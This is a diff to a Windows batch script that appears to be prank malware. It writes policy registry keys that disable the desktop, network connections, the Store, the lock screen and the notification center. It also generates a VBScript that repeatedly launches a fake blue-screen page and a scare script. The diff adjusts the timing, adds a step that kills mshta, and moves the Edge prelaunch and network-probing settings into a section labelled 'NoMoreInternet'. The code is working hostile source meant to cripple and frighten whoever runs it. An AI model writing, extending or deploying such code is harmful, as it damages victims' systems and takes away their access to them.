@@ -178,8 +178,6 @@ reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSt
 reg ADD HKLM\Software\Policies\Microsoft\Windows\Personalization /v NoLockScreen /t REG_DWORD /d 1 /f
 reg ADD HKLM\Software\Policies\Microsoft\WindowsStore /v RemoveWindowsStore /t REG_DWORD /d 1 /f
 reg ADD HKLM\Software\Policies\Microsoft\WindowsStore /v DisableStoreApps /t REG_DWORD /d 1 /f
-reg ADD HKLM\Software\Policies\Microsoft\MicrosoftEdge\Main /v AllowPreLaunch /t REG_DWORD /d 0 /f
-reg ADD HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet /v EnableActiveProbing /t REG_DWORD /d 0 /f
 reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCAVolume /t REG_DWORD /d 1 /f
 reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCANetwork /t REG_DWORD /d 1 /f
 reg ADD HKCU\Software\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
@@ -352,27 +350,43 @@ echo Set WshShell = CreateObject ("wscript.shell") >> jumpscare.vbs
 echo wscript.sleep 60000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
-echo wscript.sleep 60000 >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+echo wscript.sleep 55000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
-echo wscript.sleep 60000 >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+echo wscript.sleep 55000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
-echo wscript.sleep 60000 >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+echo wscript.sleep 55000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
-echo wscript.sleep 60000 >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+echo wscript.sleep 55000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
-echo wscript.sleep 60000 >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+echo wscript.sleep 55000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
-echo wscript.sleep 60000 >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+echo wscript.sleep 55000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
-echo wscript.sleep 60000 >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+echo wscript.sleep 55000 >> jumpscare.vbs
 echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 5000 >> jumpscare.vbs
+echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
 goto IAmGriffpatch
 
 :IAmGriffpatch
@@ -406,6 +420,8 @@ goto NoMoreInternet
 :NoMoreInternet
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoNetworkConnections /t REG_DWORD /d 1 /f 
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Policies\Microsoft\MicrosoftEdge\Main /v AllowPreLaunch /t REG_DWORD /d 0 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet /v EnableActiveProbing /t REG_DWORD /d 0 /f
 goto FreddyFazbearJumpscareGaveMeHeartAttack
 
 :FreddyFazbearJumpscareGaveMeHeartAttack
